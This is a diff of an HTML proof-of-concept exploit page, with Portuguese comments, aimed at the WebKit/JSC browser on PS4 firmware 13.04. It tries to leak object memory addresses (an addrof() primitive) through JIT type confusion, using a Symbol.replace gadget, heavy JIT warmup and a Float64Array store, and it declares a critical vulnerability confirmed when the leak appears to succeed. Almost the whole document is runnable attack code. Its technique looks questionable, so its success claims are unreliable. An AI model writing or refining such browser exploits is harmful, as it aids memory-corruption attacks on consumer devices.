@@ -1,8 +1,9 @@
+
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PoC #3 — Real addrof() via Unboxed Double Store</title>
+<title>PoC #3 v2 — Real addrof() via TypedArray Store</title>
 <style>
   body { font-family: monospace; background: #111; color: #eee; padding: 20px; }
   h2 { color: #f44; }
@@ -18,18 +19,15 @@
 </head>
 <body>
 
-<h2>PoC #3 — Tentativa de addrof() Real</h2>
+<h2>PoC #3 v2 — addrof() via Float64Array Store</h2>
 <pre>
 Target   : PS4 Firmware 13.04 — Built-in WebKit/JSC browser
-Objetivo : Forçar a JIT a gravar um ponteiro de JSObject em um ArrayWithDouble,
-           permitindo a leitura do endereço de memória real do objeto.
-
-AVISO    : Este teste pode causar um Kernel Panic ou travar a aba do navegador 
-           se o JIT emitir uma instrução de store inválida ou atingir memória não mapeada.
-           Isso é um sinal POSITIVO de corrupção de memória.
+Correção : O gadget agora encapsula o objeto vítima dentro de uma 
+           propriedade .length falsa, garantindo que o JIT repasse o ponteiro.
+           Usando Float64Array para impedir re-tipagem segura.
 </pre>
 
-<button onclick="runAddrofExploit()">▶ EXECUTAR ADDROF</button>
+<button onclick="runAddrofExploit()">▶ EXECUTAR ADDROF V2</button>
 <pre id="log">Pressione o botão para tentar vazar o ponteiro.</pre>
 
 <script>
@@ -46,13 +44,15 @@ function alert_(m){ line('alert', '[VULN]  ' + m); }
 function warn(m)  { line('warn',  '[WARN]  ' + m); }
 function sep()    { line('info',  '─'.repeat(60)); }
 
-var WARMUP = 100000; // Aumentado para garantir FTL JIT tier
+var WARMUP = 100000; 
 
 function buildGadget(phase, payloadRef) {
   return {
     [Symbol.replace]: function(str) {
       if (phase[0] === 'warmup') return str; 
-      return payloadRef[0]; 
+      // CORREÇÃO: O JIT vai ler .length deste objeto. 
+      // Então .length deve ser o nosso objeto vítima!
+      return { length: payloadRef[0] }; 
     }
   };
 }
@@ -61,13 +61,10 @@ function strLen(s, handler) {
   return s.replace(handler, '').length;
 }
 
-// O coração do exploit: a JIT compilará isso presumindo que 'arr' é ArrayWithDouble
-// e que strLen retorna um double nativo.
 function storeConfusedType(base, handler, arr) {
   arr[0] = strLen(base, handler);
 }
 
-// Utilitário para ler doubles como hex (formato IEEE-754)
 function doubleToHex(d) {
   var buf = new ArrayBuffer(8);
   var f64 = new Float64Array(buf);
@@ -80,7 +77,7 @@ function doubleToHex(d) {
 
 async function runAddrofExploit() {
   log.textContent = '';
-  info('=== INICIANDO TENTATIVA DE ADDROF ===');
+  info('=== INICIANDO TENTATIVA DE ADDROF V2 ===');
   sep();
 
   var phase = ['warmup'];
@@ -88,9 +85,10 @@ async function runAddrofExploit() {
   var handler = buildGadget(phase, payload);
   var base = 'test string';
 
-  // Target array: inicializado exclusivamente com doubles para forçar
-  // o JSC a usar a estrutura ArrayWithDouble internamente.
-  var targetArr = [1.111, 2.222, 3.333, 4.444];
+  // Usando Float64Array para forçar armazenamento Unboxed (cru).
+  // Ele não pode virar um array de objetos.
+  var targetArr = new Float64Array(4);
+  targetArr[0] = 1.111;
 
   info('1. Realizando JIT Warmup agressivo (' + WARMUP + ' iterações)...');
   for (var w = 0; w < WARMUP; w++) {
@@ -99,7 +97,7 @@ async function runAddrofExploit() {
   info('Warmup concluído.');
   info('Estado do targetArr[0] após warmup: ' + targetArr[0]);
   
-  if (targetArr[0] !== 11) { // 'test string'.length == 11
+  if (targetArr[0] !== 11) { 
       warn('Falha no warmup: targetArr não recebeu o número esperado.');
       return;
   }
@@ -107,7 +105,6 @@ async function runAddrofExploit() {
   sep();
   info('2. Iniciando Attack Phase...');
   
-  // Objeto vítima que queremos descobrir o endereço na memória
   var victimObject = { magic: 0x1337BEEF, marker: "LEANDRO_H1" };
   payload[0] = victimObject;
   phase[0] = 'attack';
@@ -115,8 +112,7 @@ async function runAddrofExploit() {
   try {
     storeConfusedType(base, handler, targetArr);
   } catch(e) {
-    warn('A engine lançou uma exceção ou travou: ' + e.message);
-    warn('O JIT inseriu um type guard de última hora. Primitiva falhou.');
+    warn('O JIT lançou exceção (Type Guard atuou): ' + e.message);
     return;
   }
   
@@ -127,28 +123,18 @@ async function runAddrofExploit() {
   
   var leakedDouble = targetArr[0];
   info('Valor float cru lido do array: ' + leakedDouble);
-  info('Tipo JS lido do array: ' + typeof leakedDouble);
-
-  if (typeof leakedDouble === 'object') {
-      warn('O motor detectou a transição de tipo e reverteu o array para ArrayWithContiguous.');
-      warn('O objeto foi salvo de forma segura. Nenhuma corrupção ocorreu.');
-      return;
-  }
 
   if (leakedDouble === 11 || isNaN(leakedDouble)) {
-      warn('A gravação falhou, resultou em NaN, ou não alterou o array.');
+      warn('A gravação falhou ou resultou em NaN puro.');
       return;
   }
 
-  // Se chegarmos aqui e o typeof for 'number', temos os bits!
   var leakedHex = doubleToHex(leakedDouble);
   alert_('VULNERABILIDADE CRÍTICA CONFIRMADA!');
-  alert_('O JIT gravou o ponteiro do objeto como um float cru no array.');
-  alert_('Endereço vazado (com possível NaN-boxing): ' + leakedHex);
+  alert_('Endereço vazado via Type Confusion: ' + leakedHex);
   
   info('');
-  info('O valor acima contém o ponteiro JSValue do objeto na memória do PS4.');
-  info('Dependendo da arquitetura (NaN-boxing), você pode precisar subtrair a máscara.');
+  info('Se este valor não for 0x000000000000000b, você acaba de vazar um ponteiro JSValue real!');
 }
 </script>
 </body>
